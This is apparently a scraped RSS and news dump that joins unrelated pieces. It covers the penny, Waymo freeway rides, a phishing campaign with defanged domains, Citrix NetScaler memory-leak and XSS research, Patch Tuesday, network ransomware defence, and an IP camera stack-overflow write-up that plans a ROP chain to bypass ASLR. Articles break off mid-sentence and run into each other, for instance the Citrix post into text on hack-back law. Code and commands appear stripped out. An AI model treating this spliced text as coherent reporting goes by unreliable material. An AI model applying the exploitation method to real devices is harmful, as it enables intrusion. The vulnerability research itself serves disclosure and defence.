            Joe Ditler, a 74-year-old writer and historian from Coronado, California, said he still has an old cigar box filled with mostly pennies given to him by his grandfather. He remembers flattening pennies on railroad tracks or souvenir machines in amusement parks.
    
            However, he only occasionally uses pennies to make a cash purchase. And he generally tosses any one-cent coin he gets as change in the tip jar along with the rest of his tip.
    
            “They bring back memories that have stayed with me all my life,” he said. “The penny has had a wonderful life. But it’s probably time for it to go away.”

The company would eventually become Waymo, autonomous vehicle testing would expand — fanning out to other cities. Eventually, the company launched commercial robotaxi services in Phoenix, San Francisco, and Los Angeles. Other cities soon followed. But freeways, despite some of that early testing, would remain out of reach. Until today. Waymo said Wednesday it will begin offering robotaxi rides that use freeways across San Francisco, Phoenix, and Los Angeles, a critical expansion for the company that it says will reduce ride times by up to 50%. That stat could help attract a whole new group of users who need to travel between the many towns and suburbs within the greater San Francisco Bay Area or quicken commutes across the sprawling Los Angeles and Phoenix metro areas. Using freeways is also essential for Waymo to offer rides to and from the San Francisco Airport, a location the company is currently testing in. The service won’t be offered to all Waymo riders at first, the company said. Waymo riders who want to experience freeway rides can note their preference in the Waymo app. Once the rider hails a ride, they may be matched with a freeway trip, according to the company.The company’s robotaxi routes will now stretch to San Jose, an expansion that will create a unified 260-mile service area across the Peninsula, according to Waymo. The company said it will also begin curbside drop off and pick up service at the San Jose Mineta International Airport. It already offers curbside service to the Sky Harbor Phoenix International Airport.“Freeway driving is one of those things that’s very easy to learn, but very hard to master when we’re talking about full autonomy without a human driver as a backup, and at scale,” Waymo co-CEO Dmitri Dolgov said in a media briefing with reporters. “It took time to do it properly, with a strong focus on system safety and reliability.”Waymo robotaxis have been spotted on freeways for months. TechCrunch took a test ride last year in the Phoenix area that included freeways. The company has provided trips to employees for more than a year. It also expanded testing to include closed course and simulationWhile many assume freeway driving is easier, it comes with its own set of challenges, principal software engineer Pierre Kreitmann said in a recent briefing. He noted that critical events happen less often on freeways, which means there are fewer opportunities to expose Waymo’s self-driving system to rare scenarios and prove how the system performs when it really matters. The company chose to augment its public road driving with a combination of closed course and simulation testing.This expanded testing and validation of the software was done to ensure the vehicles transition smoothly and safely between freeways and surface streets, and recognize and adapt to the unique context of the road around them, Kreitman said. Waymo has also expanded its operational protocols, including how it coordinates with safety officials like California Highway Patrol, now that its robotaxis are on freeways. ]]></content:encoded></item><item><title>Phishing emails disguised as spam filter alerts are stealing logins</title><link>https://www.malwarebytes.com/blog/news/2025/11/phishing-emails-disguised-as-spam-filter-alerts-are-stealing-logins</link><author></author><category>threatintel</category><pubDate>Wed, 12 Nov 2025 16:02:39 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[Cybercriminals are spoofing “email delivery” notifications to look like they came from spam filters inside your own organization. The goal is to lure you to a phishing site that steals login credentials—credentials that could unlock your email, cloud storage or other personal accounts.The email claims that, due to an upgrade in the Secure Message system, some pending messages didn’t make it to your inbox and are ready to be moved there now.“Email Delivery Reports: Incoming Pending MessagesWe have recently upgraded our Secure Message system, and there are pending messages that have not been delivered to your Inbox.Failure Delivery MessagesEmail Delivery Reports For  info@seychellesapartment.com   Status :                         Subject:                      Date:            Time:{A couple of message titles that are very generic and common as not to raise any suspicion}Note     : The messages will be delivered within 1-2 hours after you receive a confirmation Mail Notice.

The links pass the spoofed email address as a base64-encoded string to the phishing site. Going to that site, we were served this fake login screen with the target’s domain already filled in—making it look personalized and legitimate:Contrary to Unit42’s findings, we found that this version of the attack is more sophisticated and likely evolving quickly. The phishing site’s code is heavily obfuscated, and credentials are harvested through a websocket.A websocket keeps an open channel between your browser and the website’s server—like a phone call that never hangs up. This lets the browser and server send messages instantly back and forth, in both directions, without needing to reload the page. Cybercriminals love using websockets because they receive your details the instant you type them into a phishing site, and can even send prompts for additional information, such as two-factor authentication (2FA) codes.This means that if you enter your email and password on such a site, attackers could instantly take control of your email, access cloud-stored files, reset other passwords, and impersonate you across services.How to stay safe from phishing emailsIn phishing attempts like these, two simple rules can save you from lots of trouble.Don’t open unsolicited attachmentsAlways check the website address in the browser before signing in. Make sure it matches the site you expect to be on.Other important tips to stay safe from phishing in general:Always check if the sender’s email address matches what you would expect it to be. It’s not always conclusive, but it can help you spot some attempts. through another channel if you receive an attachment or a link you weren’t expecting.Keep your device and all its software updated.Use multi-factor authentication (MFA) for every account you can.Password managers will not auto-fill a password to a fake site, even if it looks like the real deal to you.If you already entered credentials on a page you don’t trust, change your passwords immediately.several subdomains of mdbgo[.]ioxxx-three-theta.vercel[.]appveluntra-technology-productivity-boost-cold-pine-8f29.ellenplum9.workers[.]devWe don’t just report on threats—we remove them]]></content:encoded></item><item><title>Google Sues China-Based Hackers Behind $1 Billion Lighthouse Phishing Platform</title><link>https://thehackernews.com/2025/11/google-sues-china-based-hackers-behind.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8QizRTvnh2FKfShLUyRGB3nG7j8gwkx9JSvsjDH6VcXmTi9PjdDOHeM-xRjC7uhftMQ097vBryvyFeF0z8tPOWqVEa9qU8vAJxXeppNmdDMAW4ISJScYLrYVS45803vYriSa6qDzZ2mhH0lq00WHCJQhvW7nFIVbYMrTns6Z8rC-yF68QEtar56NWcec1/s1600/google-phishing.jpg" length="" type=""/><pubDate>Wed, 12 Nov 2025 15:48:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Google has filed a civil lawsuit in the U.S. District Court for the Southern District of New York (SDNY) against China-based hackers who are behind a massive Phishing-as-a-Service (PhaaS) platform called Lighthouse that has ensnared over 1 million users across 120 countries.

There’s an elegance to vulnerability research that feels almost poetic - the quiet dance between chaos and control. It’s the art of peeling back the layers of complexity, not to destroy but to understand; to trace the fragile threads that hold systems together and see where they might fray.

There’s beauty in that tension - the simultaneous act of breaking and creating, of exposing weakness to make strength possible. It’s a kind of intellectual intimacy, where curiosity meets consequence, and discovery hums just beneath the surface of what others take for granted.

And sometimes, you casually click your way to a vulnerability with a web browser.

Yes! We are discussing security appliances today!

As we’ve discussed before, it’s not uncommon to stumble into zero-days while exploring a code base or system in the pursuit of reproducing an N-day.

### CitrixBleed2

That’s exactly what happened in August 2025, when we triggered a rapid-response event across our client base for CitrixBleed2 (CVE-2025-5777) - a vulnerability affecting Citrix NetScaler appliances.

CitrixBleed2 was the second edition (which one do you have the fondest memories of?) of CitrixBleed - another painful memory leak vulnerability. These memory leak vulnerabilities allowed for the arbitrary disclosure of memory, pre-authentication - reportedly playing a role in the ransom of numerous organizations, weaponized trivially by identifying SSLVPN session IDs (and similar) contained within leaked memory.

This time, within the spools of our own collateral damage, we’ll be discussing the vulnerabilities we stumbled into:

- WT-2025-0089 - Memory Leak (but, not in the real world - no CVE)
- WT-2025-0090 - Reflected XSS (assigned CVE-2025-12101)

Stop - **before you start screaming, this (the Memory Leak) is not another CitrixBleed.**

But, there is a pattern - and when a vulnerability that discloses memory is triggered by purely misconfiguring a device (as opposed to things your average user couldn’t do with a web browser), you have to wonder what design and architecture choices resulted in this feeling of fragility around reading of memory.

### WT-2025-0089 - The Memory Leak, Explain

While analyzing CitrixBleed2, we were forced to become certified Citrix NetScaler experts - sacrificing what felt like a disproportionate amount of time to configure an appliance.

Within this lost time, we were forced to configure AAA. “What’s AAA”, every unharmed human asks?

> The AAA feature stands for **Authentication, Authorization, and Auditing**— essentially, the part of Citrix that decides _who_ can log in, _what_ they can access, and _what_ they do once inside.

> When a user connects through Citrix Gateway, the AAA system validates their credentials (via username, password, or even SAML), applies access rules, and logs the session for auditing. In short, it’s the **gatekeeper** that controls and monitors all access to Citrix applications and resources.

Visually represented as below:

If you’ve ever configured a Citrix NetScaler device - you likely dream of a career in goat farming. We are so sorry, and we now understand.

As we stumbled through the configuration process, we did something everyone expects - we made a mistake.

At one point, we skipped a step. But, our eyes widened when we realised this omission had resulted in a condition that left the appliance spewing memory.

When in this condition, browsing to / on the affected device would return a helpful error message (UX is important!), and leaked memory:

To reproduce this issue:

1. Create a new AAA virtual server via the web interface
2. Without enabling the feature via CLI, the root page of the web interface will start leaking memory

For context, this is how the feature is normally enabled via the CLI:

### How Do We Feel About This?

Not great? The vulnerability itself, while not ideal is frankly not a real-world concern given the likelihood of this wildly improbable configuration (we found none) existing in any Internet-exposed environment.

Citrix confirmed with us that this was their view as well, and thus decided to not assign a CVE:

After reviewing the issue, we’ve determined that the behavior stems from a misconfiguration of the appliance. Specifically, configuring a AAA virtual server without enabling the AAA feature is not a recommended setup. **Please note that the authentication functionality will not operate unless the AAA feature is enabled.**

Our documentation provides guidance on this configuration: https://docs.netscaler.com/en-us/citrix-adc/current-release/aaa-tm/entities-of-authentication-authorization-auditing/authentication-virtual-server.html

However, we understand that some customers may inadvertently configure their appliances this way. To help prevent this unsupported configuration in the future, we’ve made changes in the code that will prevent it going forward.

We can’t say we disagree - their assessment is fair and pragmatic, there is a all-but-zero chance of this vulnerability actually existing in the wild.

However, what should be of concern is the bigger picture - the trend, very clearly suggesting that memory management continues to appear very fragile within Citrix NetScaler appliances, to the extreme that even just misconfiguring an appliance by accident leads to disclosure of leaked memory.

It feels like we are playing catch with a highly-sensitive gun that continues to harm innocent bystanders - within, once again, what many will consider a highly-critical appliance and security control.

Will we see another memory leak vulnerability in Citrix NetScaler? We have no idea. But if we were to meme…

### WT-2025-0090 - SAML RelayState Reflected XSS

While poking around the appliance, we identified what looked like a simple and trivial Open Redirect vulnerability within the SSO flows used by Citrix NetScaler - specifically in the usage of the `RelayState` parameter.

For example, the below HTTP POST request contains a `RelayState` parameter with a base64 encoded value of “https://watchTowr.com”:

Although hack backs can take on various forms, they are—­by definition­—not passive defensive measures.”As the law currently stands, specific forms of purely defense measures are authorized so long as they affect only the victim’s system or data.At the other end of the spectrum, offensive measures that involve accessing or otherwise causing damage or loss to the hacker’s systems are likely prohibited, absent government oversight or authorization. And even then parties should proceed with caution in light of the heightened risks of misattribution, collateral damage, and retaliation.As for the broad range of other hack back tactics that fall in the middle of active defense and offensive measures, private parties should continue to engage in these tactics only with government oversight or authorization. These measures exist within a legal gray area and would likely benefit from amendments to the CFAA and CISA that clarify and carve out the parameters of authorization for specific self-defense measures. But in the absence of amendments or clarification on the scope of those laws, private actors can seek governmental authorization through an array of channels, whether they be partnering with law enforcement or seeking authorization to engage in more offensive tactics from the courts in connection with private litigation.]]></content:encoded></item><item><title>[Webinar] Learn How Leading Security Teams Reduce Attack Surface Exposure with DASR</title><link>https://thehackernews.com/2025/11/webinar-learn-how-leading-security.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjb7usGljMR3vSfxxk9XeKY39fUcIRMFDq6GOy0OEA_AK7P4ybAoHwl9Ga45OJ5pZPzpDhwqZ0D6PKEI-IFFifcl-NWBM5ymJ6wcNSyL3bneCMbRbVGz1ca3MIaKDHWbNvOVzK1LinCOt0RLYF1-zb_Zy11bGddkRxowymBu754CFJDpCDIreh4iiGF4loK/s1600/cyberteams.jpg" length="" type=""/><pubDate>Wed, 12 Nov 2025 11:55:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Every day, security teams face the same problem—too many risks, too many alerts, and not enough time.

By chaining it with other attacks, they can gain full admin access, install malware, steal data, or make deeper changes you wouldn’t normally be able to undo. Run Windows Update today, restart your PC, and check you’re up to date.Microsoft releases important security updates on the second Tuesday of every month—known as “Patch Tuesday.”  This month’s patches fix critical flaws in Windows 10, Windows 11, Windows Server, Office, and related services.Particularly noteworthy are some critical Remote Code Execution (RCE) bugs in Microsoft Graphics and Office that can allow attackers to run malicious code just by convincing someone to open a booby-trapped file or document.A “zero-day” is a software flaw that attackers are already exploiting before a fix is available. The name comes from the fact that defenders have  to protect themselves—attackers can strike before patches are released. In this month’s update, Microsoft fixed one such vulnerability: CVE-2025-62215, a Windows Kernel Elevation of Privilege (EoP) flaw.It lets an attacker who already has local access to a device gain higher, admin-level permissions by exploiting what’s known as a “race condition.” A race condition vulnerability happens when different programs or processes try to use the same resource at the same time without proper coordination. During that brief window of confusion, attackers can slip through and exploit the system.Attackers need to combine this vulnerability with other attack methods. Once they’ve compromised a system, they use this vulnerability to escalate privileges and gain admin-level rights.Another critical vulnerability worth noting is CVE-2025-60724, which comes with a CVSS score of 9.8 out of 10. It’s a heap-based buffer overflow in the GDI+ Microsoft Graphics Component, which allows an unauthorized attacker to run malicious code over a network.A buffer overflow happens when software writes more data to memory than it can handle, potentially overwriting other areas and injecting malicious code. In the case of CVE-2025-60724, Microsoft warns that attackers could exploit the flaw by convincing a victim to download and open a document that contains a specially crafted metafile. In more advanced attacks, the same vulnerability could be triggered remotely by uploading a malicious file to a vulnerable web service.How to apply fixes and check you’re protectedThese updates fix security problems and keep your Windows PC protected. Here’s how to make sure you’re up to date:Click the  button (the Windows logo at the bottom left of your screen).Click on  (it looks like a little gear).In the Settings window, select  (usually at the bottom of the menu on the left).Click the button that says .Windows will search for the latest Patch Tuesday updates for November 2025.If you have selected automatic updates earlier, you may see this:Which means all you have to do is restart your system and you’re done updating.If not, continue with the below.If updates are found, they’ll start downloading right away. Once complete, you’ll see a button that says  or .Click if needed and follow any prompts. Your computer will usually need a restart to finish the update. If it does, click .5. Double-check you’re up to dateAfter restarting, go back to  and check again. If it says , you’re all set!We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Active Directory Under Siege: Why Critical Infrastructure Needs Stronger Security</title><link>https://thehackernews.com/2025/11/active-directory-under-siege-why.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgzohgVmJwL0IMF6xUDk-7UKhnswaBtnht8YAdjmMgnPeft_d_PwFL5ZFvm9zfO_pKg-RkmHgwEM9Uyj6lr5GnUB_Y4IM2oDsroi0pC1yYS6-zdbpiGX-gIlpFQwmBgy-4TcXvQ3NtTXheeqFVh6DL9RUjug2QhaFGFZJOtiJdPOkC1jkZWBuJIJsIHwS0/s1600/MAIN.jpg" length="" type=""/><pubDate>Wed, 12 Nov 2025 11:07:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Active Directory remains the authentication backbone for over 90% of Fortune 1000 companies.

Systems are protected, definitions are up to date, behavioral analysis is active. Then, suddenly, files across your network start getting encrypted. Backups are being deleted. Ransom notes appear across your machines. Your security software shows nothing. No alerts, no detections, no blocked processes. How is this possible? This isn’t a hypothetical situation. It’s a real attack technique that ransomware operators are actively using to bypass even sophisticated protection systems. The attack exploits a fundamental assumption in how security software operates: that the malicious process and the files being attacked are on the same machine. When that assumption breaks down, traditional defenses fail. Malwarebytes ransomware protection works through multiple defensive layers. These include AI-based analysis, machine learning models, signature detection, runtime sandboxing, exploit mitigation, and web protection. Each layer stops threats at different stages. The Anti-Ransomware behavioral layer monitors actual file encryption behavior in real time. Malwarebytes continuously enhances all layers of its defense.  This article discusses a recent innovation in our Anti-Ransomware behavioral monitoring technology. The result is a comprehensive enhancement incorporating innovations in file monitoring, network session tracking, behavioral analysis, and real-time threat correlation. Why traditional protection failsTo understand why a ransomware attack over a network is so effective, we need to understand how this technology  works. The Anti-Ransomware component sits between applications and the file system, allowing it to see every file operation before it completes. When a process tries to open, read, or write a file, specialized callbacks are triggered. Think of these as security checkpoints where the security driver can inspect what’s happening and decide whether to allow the operation. The software looks at patterns: Is this process rapidly encrypting many files? Is it adding suspicious extensions? Is it attempting to delete backup Copies? These behavioral indicators, when combined, signal ransomware. This architecture works brilliantly when the ransomware process and the files being encrypted are on the same machine. The driver sees the process, tracks its behavior over time, builds a threat profile, and can block it before significant damage occurs. But what happens when ransomware runs on one device and attacks files on another? For example, an attacker compromises an unprotected device, a legacy device without current protection or an unmanaged guest device, and uses it to encrypt files on protected systems through network shares. Your machine doesn’t see any suspicious programs running. It just looks like someone is accessing files over the network, which happens all the time. This creates a perfect hiding spot for ransomware. On the attacking device, there might be no security software installed. On your main PC where files are being encrypted, the security software sees files changing but can’t tell which program is causing it. The connection between the malicious program and your files is hidden. Multiple ransomware variants have adopted this technique. They use specific commands to target network folders and shared drives. These aren’t random attacks. They’re carefully designed to bypass security software through remote encryption These aren’t opportunistic attacks. They’re carefully engineered for bypassing traditional anti-ransomware protection through remote encryption. Two-part protection architectureSolving this problem required addressing two distinct attack vectors. Part 1 involves a local process attacking remote files, while Part 2 involves a remote process attacking local files. Each required different technical approaches. Part 1: Detecting local to remote attacksWhen a program tries to access files on your network or shared folders, Malwarebytes checks if it’s behaving suspiciously. If the program is rapidly changing many files and creating ransom notes, the system builds a threat score in real time. The key innovation is that Malwarebytes tracks local and network activity separately. A program might be safely working with files on your computer while attacking files on another device through the network. By monitoring both, we can catch ransomware without false alarms. When Malwarebytes detects ransomware behavior, it blocks the malicious program immediately, stopping the attack before your files are encrypted. Part 2: Detecting remote to local attacksThe second challenge is harder: what if the ransomware is running on another device and attacking your files remotely? There’s no malicious program on your computer to block. Our solution tracks network connections. When files are accessed from another device on your network, Windows keeps information about which device is connecting. Malwarebytes captures this information and watches for suspicious behavior, like rapidly changing many files, adding suspicious file extensions, or creating ransom notes. When we detect an attack coming from another device, we block that specific connection from accessing your files. Innovation in ransomware protectionOur implementation operates through our specialized components. This architecture is essential for both performance and security. Every file operation goes through our filter, so we need to process decisions in microseconds to avoid impacting system responsiveness. We implemented multiple optimization layers. First, we filter out file operations that categorically cannot be ransomware related. Opening a file for read only access is not a threat, so we skip detailed analysis. Operations that only query metadata happen constantly in Windows and can be safely ignored for ransomware detection purposes. For operations that require analysis, we implemented a sophisticated indicator time-to-live (TTL) system. Behavioral indicators decay over time. This prevents false positives from legitimate activities like file synchronization tools or backup software. The network session tracking component required deep integration with Windows networking. We extract session information by accessing internal structures that Windows uses for network file serving. Our exclusion system supports IPv4, IPv6, hostnames, and CIDR notation for network ranges. What makes this protection differentSeveral factors distinguish the Malwarebytes approach from other solutions. The first is comprehensiveness. Many security vendors address this partially. Remote processes attacking local files or where local processes attack remote files. An attacker who compromises a single endpoint can still encrypt the shared resources. Malwarebytes protects against both vectors. Second is precision. Many solutions block entire network connections or lock accounts when they detect threats. Malwarebytes is more precise. We block only the specific malicious connection. Other activities from the same device continue working normally. Only the ransomware’s access is stopped. Third is performance. Malwarebytes runs efficiently without slowing down your computer. Fourth is proven protection. This technology has been tested and deployed across many different business and home networks. It is proven to work in real world situations. This protection does more than just stop one type of ransomware attack. It represents a new way of thinking about network-aware security. The old approach treated each device separately, but that doesn’t work when attackers use network connections to spread threats. Security solutions need to understand that attacks can come from any device on the network and target any accessible files. The technology we’ve built can do more than stop ransomware. The same system that tracks network connections and monitors suspicious behavior can help detect other threats, like someone trying to steal your data or access files they shouldn’t have permission to view. Attackers will keep evolving their methods. The attacks we’re seeing now will become more sophisticated. They might try to disguise themselves as normal computer maintenance or file management. Our protection is designed to adapt. Because it watches for suspicious patterns of behavior rather than looking for specific known attacks, it can detect new variations without needing constant updates. Ransomware keeps evolving, and attackers constantly find new ways to bypass security. Malwarebytes is committed to staying ahead with real innovation. This enhancement closes a critical gap that many security programs don’t address until it’s too late. If you’re choosing security software or reviewing your current protection, ask yourself: Does it protect against ransomware that spreads through network shares? This is becoming increasingly important as more ransomware attacks use this technique. We don’t just report on threats—we remove them]]></content:encoded></item><item><title>MacOS Infection Vector: Using AppleScripts to bypass Gatekeeper</title><link>https://pberba.github.io/security/2025/11/11/macos-infection-vector-applescript-bypass-gatekeeper/</link><author>/u/dashboard_monkey</author><category>netsec</category><pubDate>Wed, 12 Nov 2025 09:19:22 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Google Launches &apos;Private AI Compute&apos; — Secure AI Processing with On-Device-Level Privacy</title><link>https://thehackernews.com/2025/11/google-launches-private-ai-compute.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7u0YyGlwQEZFWpce5m9bHa4DibuFf1-votoLyZ6m1wkceOdtkkpGLrjkM9tyYHVQJVZSz5KQvJ9FxxCcr7KFlWm_d9DKdDx84iYRRp7J7rQHYRlAMdhF65AYDLZT_T-FWmwdXzULM-r1oHGTPENO8-oluI3HcVTXYUG3Pu-0m4IEhC0M6PLYVxgt_JWaQ/s1600/google-ai.gif" length="" type=""/><pubDate>Wed, 12 Nov 2025 08:35:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Google on Tuesday unveiled a new privacy-enhancing technology called Private AI Compute to process artificial intelligence (AI) queries in a secure platform in the cloud.

In this follow-up post, I will take you through building a considerably more complex binary exploit. We will explore the path from firmware extraction and analysis to the discovery of a previously unknown vulnerability and its exploitation. Follow along as we build an ARM ROP chain to bypass ASLR without an address leak, and achieve unauthenticated RCE.I examined the IN-8401 2K+, an IP camera from the German manufacturer INSTAR. It’s a modern networked surveillance camera that exposes a web-based user interface for configuration and live view. As I later found this particular model shares its firmware with other devices from INSTAR’s 2K+ and 4K series. According to Shodan there are roughly 12,000 INSTAR devices visible on the public internet.Before we can meaningfully hunt for vulnerabilities, we need to gain access to the device to obtain its firmware. Access to the firmware exposes binaries, configuration files, scripts and the filesystem layout and enables both static inspection and dynamic testing. Without the firmware we’re stuck with blind fuzzing of the network interface.It’s always a good idea to collect as much information as possible before diving into analysis mode. So I started with some reading. INSTAR provides quite an extensive documentation about its cameras and their features. I found a very interesting page titled “Restore your HD Camera after a faulty Firmware upgrade”. The article explained that the camera exposes a UART interface and how it could be accessed to restore a firmware image. UART is a hardware interface used for serial communication commonly found on development boards, embedded systems, and debugging interfaces. In the documentation it looked like it’s possible to boot right into a root shell.Although the article was written for the HD camera models, not my 2K+, I figured it might be worth a shot, since manufacturers often reuse features and components across different product versions. I removed the front part of the housing and spotted the debugging interface as shown on the wiki page.I went ahead and attached some PCBites to the interface and connected them to a FTDI, which is a small USB-to-serial converter.I then plugged the FTDI into my Linux machine and connected to it. After supplying some input over the serial connection I was greeted with a login prompt, cool!I tried a couple of the usual combinations like admin:admin, root:root, and so on, but had no success. The documentation explained that the boot process could be interrupted to obtain a root shell on the device’s OS. So I rebooted the camera to see if that worked.As you can see there was indeed a mechanism to stop the device from autobooting. But contrary to what the documentation suggested, interrupting the boot process didn’t provide a root shell on the OS, only in the U-Boot bootloader. U-Boot (short for Universal Bootloader) is an open-source bootloader commonly used in embedded systems to initialize hardware and load the operating system or firmware during startup.I noticed that the Kernel boot parameters were provided by an environment variable called . I went ahead an tried the  trick which tells the Kernel to start a shell instead of the init process. I updated the variable accordingly and tried to boot using .It worked. I added a new root user and rebooted the device. Now I was able to login to the device using the newly created user. I dumped the whole filesystem for analysis and as a backup so I could also restore it later, if anything went wrong along the way.High-Level Architecture & Attack SurfaceWith the device unlocked and open for exploration it’s very easy to get swept away by curiosity. With the goal of finding exploitable vulnerabilities in mind it’s important to lay out something like an attack surface map first.The web stack consisted of various components, most prominently a lighttpd web server that acted as an entry point and reverse proxy. I started by inspecting its configuration to see what it was doing. As you would expect from a reverse proxy, incoming requests were forwarded to the appropriate backend. For example, requests to files ending with  were routed to the fcgi_server binary through a socket at .I was mainly interested in finding code that was reachable without authentication. From my initial exploration I knew that there was an SQLite database file where the web interface users were stored, so the binary that performed authentication had to access this file. However, I couldn’t confirm that  was interacting with it. I concluded another component must be involved. In the process list I noticed a process called . I attached  to see what it was doing and found that incoming requests for most endpoints were forwarded from  to  via .As you can observe, the HTTP request wasn’t forwarded as-is, it was first serialized using some type of Type–Length–Value (TLV) structure. These observations also made it clear that authentication and the core application logic reside in the  backend.With this, I had identified two interesting targets:  and , both of which were reachable by an unauthenticated attacker.With the two main targets  and  identified we can now focus on searching for vulnerabilities. In this section I want to quickly touch on the methods I employed for doing so.Probably one of the most important ingredients for efficient vulnerability hunting is having a proper debugging setup in place. This allows for quickly double-checking any assumptions made during static analysis, tracing calls, and so on. I ran more or less an identical setup to the one used in the last research with a gdb server on the IP camera and a gdb client on the attacker’s machine.For this research I primarily used two approaches: fuzzing, and a combination of static and dynamic analysis. I started off with something that I would call a very primitive way of black-box fuzzing using boofuzz on collected web endpoints. I tried fuzzing through all possible parameters I had found on various endpoints to see if I could trigger a crash. Although this approach yielded CVE-2025-8761, I felt like it was very inefficient as a crash of the whole system was the only thing I was able to reliably detect (more on that later).As a secondary approach I spent quite some time on reverse engineering the two binaries  and . I tried to get an understanding of how things work while focusing on the usual suspects for memory corruption like bounds checking, pointer arithmetic, etc. To speed things up my process usually involved examining the decompiled binary, making assumptions, and verifying them using  and  dynamically.Let’s have a look at some code. As described earlier  acted as some sort of custom middleware that translated web requests into ipc messages. In the decompiled binary I found a dispatcher for  endpoints which called certain handler functions based on the given URI.In most of the handler functions a similar pattern emerged. Inside each handler there was a call to the same function which looked like another dispatcher. I identified the second dispatcher as some sort of authentication handler.I assumed that the code had to extract and serialize the corresponding auth data from http requests differently, depending on the authentication mechanism used. There were several different handlers one of which I identified as the basic auth handler.Inside the basic auth handler, there was a call to another function that looked like a custom implementation of Base64 decoding. As you might have noticed, the decompiled code contained typical C++ elements such as class methods, this pointers, and references to the C++ standard library. Most of the string-related functionality I had seen so far was therefore using C++’s standard string handling. In this case, however, I noticed a  that copied the decoded Base64 result into a fixed-size buffer (516 bytes) located on the stack.Without spending much more time on static analysis, I moved on to perform some dynamic testing of the basic authentication functionality. First, I needed to verify my assumption that the basic auth handler and Base64 decode function were being triggered, so I set a few breakpoints and sent a request.The breakpoints triggered which confirmed my assumptions so far and I got back a 500.Then I sent another request with a very long basic auth string exceeding the 516 buffer length in the base64 decode function.I got back another 500. However, the response wasn’t the same, this time it included an HTML error message. Strange, right? Let’s have a look at what the serial terminal showed.What happened? The program had crashed.  indicates that I had overwritten the stack since the code took the return address from the stack and tried jumping to it. In this case  which corresponds to the payload sent. I had found a stack-based buffer overflow.Why hadn’t I discovered this vulnerability during my initial fuzzing? I figured there were two reasons:The HTTP status code was the same as for a normal request, only the response body differed. So getting a 500 response to the request was nothing unusual.The lighttpd server immediately restarted , so the crash wasn’t noticeable from an outside perspective.This once again highlights the importance of a proper debugging setup.Before we jump to the fun part, a quick heads up: If you’re not familiar with binary exploitation or the ARM architecture I’d recommend to have a look at the previous blog post first as many concepts are similar to those from the previous research and won’t be described in detail in this post.Let’s first discuss the preconditions of exploiting the discovered stack-based buffer overflow. We’re dealing with an ARMHF 32 bit binary, dynamically linked and stripped. As shown by  the target binary isn’t protected by stack canaries, but does have the NX mitigation enabled. It isn’t compiled as a position independent executable (PIE) and has partial relocation read-only (RELRO).What does this mean for us as attackers? Overwriting return addresses on the stack with an overflow is straightforward because of the lack of stack canaries. However, we can’t execute shellcode on the stack. Also, the binary will always be placed in the same memory region, because it wasn’t compiled as a PIE. Finally, partial RELRO means that the global offset table (GOT) comes before the BSS section in memory, which holds uninitialized global and static variables. This eliminates the risk of a buffer overflow from a global variable overwriting GOT entries. Since our overflow is on the stack, this doesn’t really matter to us. What does matter though, is that it also means that the GOT is writable. Only full RELRO provides a read-only GOT.Let’s also have a look at the libraries included by the target binary such as the libc. We can see that libc was compiled with PIE, meaning that it can be placed randomly in memory during runtime.Evidently, when looking at the mitigations in place, it makes sense to consider a Return-oriented programming (ROP) chain to achieve command execution. A ROP chain leverages small code snippets, or gadgets, already present in a program’s memory. By linking these gadgets, an attacker constructs an unintended, attacker-controlled execution flow. The effectiveness of a ROP chain depends on the availability of suitable gadgets and the attacker’s knowledge of their memory addresses.In our case we could use gadgets from the target binary () itself because their addresses are static and therefore known. These gadgets are quite limited though and eventually we would need to call file I/O functions or  provided by libc to gain command execution. Note that libc was compiled with PIE. I quickly confirmed on the device that address space layout randomization (ASLR) was enabled, so libc was indeed placed at a random address in memory.I came up with a couple of ideas on how to deal with this:Find a libc address leak through another vulnerabilityFind a file read for /proc/self/mapsLeak a libc address through a ROP chainUnfortunately, I couldn’t quickly find another vulnerability that would let me leak a libc address. I considered reading  to locate libc, but that proved unsuccessful. I also looked into using gadgets in the target binary to build a ROP chain to leak a libc address. However, there was no straightforward way to exfiltrate the leaked pointer.A bigger issue was that any ROP chain would eventually crash the binary, rendering the leak useless because libc would be relocated on the next start of . In a stack-based buffer overflow, it’s also impossible to restore the stack to its previous state, as the very information required for restoration is overwritten.One approach often used in this kind of scenario is to trigger the bug multiple times to prolong the crash: trigger it once to leak an address, then return to the vulnerable function and trigger the overflow again to make use of the leak. However, that approach requires an I/O channel to read the leak and then supply input again. Given the web-stack architecture we discussed and the bug’s location, that wasn’t feasible, so I concluded a one-shot exploit was likely the only viable option.There are several known techniques that revolve around the GOT and Procedure Linkage Table (PLT) to bypass ASLR. When a call to an external function such as  (libc) is made, the immediate call goes to  which acts as a resolver of the actual address of  within libc. The resolved address is then stored in the GOT. If a specific function has already been resolved previously it is taken from the GOT by the  stub.So the information needed to bypass ASLR lives in the GOT. Ideally we’d find the address of  there, but the target binary never references , so it has no GOT/PLT entry. Instead, we could read a GOT entry for another function, compute the offset from that function to our target, and use that to redirect execution to the target. But all of this must be done via a ROP chain built from gadgets available in the binary.The high level steps would look something like this:Read a GOT entry and store in register xIncrement/decrement register x to reach target function (eg. addition, multiply, etc.)Increment/decrement value pointed to by GOT pointer to reach target function (GOT is writable)Dereference GOT pointer into register xStill a vast simplification, we would still need to move arguments into the correct registers and so on before jumping to the target function  but it’s a starting point.To pursue this idea I first wanted to find a GOT entry that is already populated when triggering the vulnerability. Within the vulnerable base64 decode function there is a call to  which is a libc function. Let’s have a look at its PLT and GOT entries.Using  we can see the address of the PLT entry inside  of To verify the corresponding GOT entry and actual address at runtime I set a breakpoint at the return statement after the overflow.As you can see the GOT 